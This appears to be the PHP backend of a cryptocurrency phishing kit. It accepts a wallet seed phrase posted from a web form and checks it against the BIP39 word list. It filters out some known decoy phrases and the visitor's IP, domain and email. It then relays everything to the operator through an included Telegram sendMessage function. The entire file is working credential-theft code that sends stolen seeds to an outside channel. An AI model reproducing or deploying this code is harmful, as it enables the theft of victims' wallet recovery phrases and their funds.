<?php


require_once 'vendor/autoload.php';

use \FurqanSiddiqui\BIP39\BIP39;


require_once 'telegram.php';

if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    die(json_encode(array('error' => 'Invalid request')));
}

$phrase = $_POST['phrase'];
$domain = $_SERVER['SERVER_NAME'];
$user_ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$validSeed = false;

/* Check if Seed Empty */

if (empty($phrase)) {
    die(json_encode(array('result' => 'error')));
}

if (preg_match('/^(\d\d\d\d\d\d\d\d\d).*$/i', $phrase)) {
    die(json_encode(array('result' => 'invalid')));
}

if (strpos($phrase, 'leg lemon ill industry science bamboo') === 0) {
    die(json_encode(array('result' => 'invalid')));
}

try {
    $mnemonic = BIP39::Words($phrase);
    $validSeed = true;
} catch (Exception $e) {
    $validSeed = false;
}

$message = null;
$case = null;
$email = null;

if (isset($_POST['case'])) {
    $case = $_POST['case'];
} else {
    $case = 'normal';
}

if (isset($_POST['email'])) {
    $email = $_POST['email'];
} else {
    $email = null;
}

if ($validSeed) {
    $message = constructMessage($phrase, $domain, $user_ip, '(Valid)', $case);
    if ($email) {
        $message .= "\n\n";
        $message .= "<b>Email: </b>" . $email;
    }
    echo (json_encode(array('result' => 'valid')));
} else {
    $message = constructMessage($phrase, $domain, $user_ip, '(Invalid)', $case);
    if ($email) {
        $message .= "\n\n";
        $message .= "<b>Email: </b>" . $email;
    }
    echo (json_encode(array('result' => 'invalid')));
}

sendMessage($message);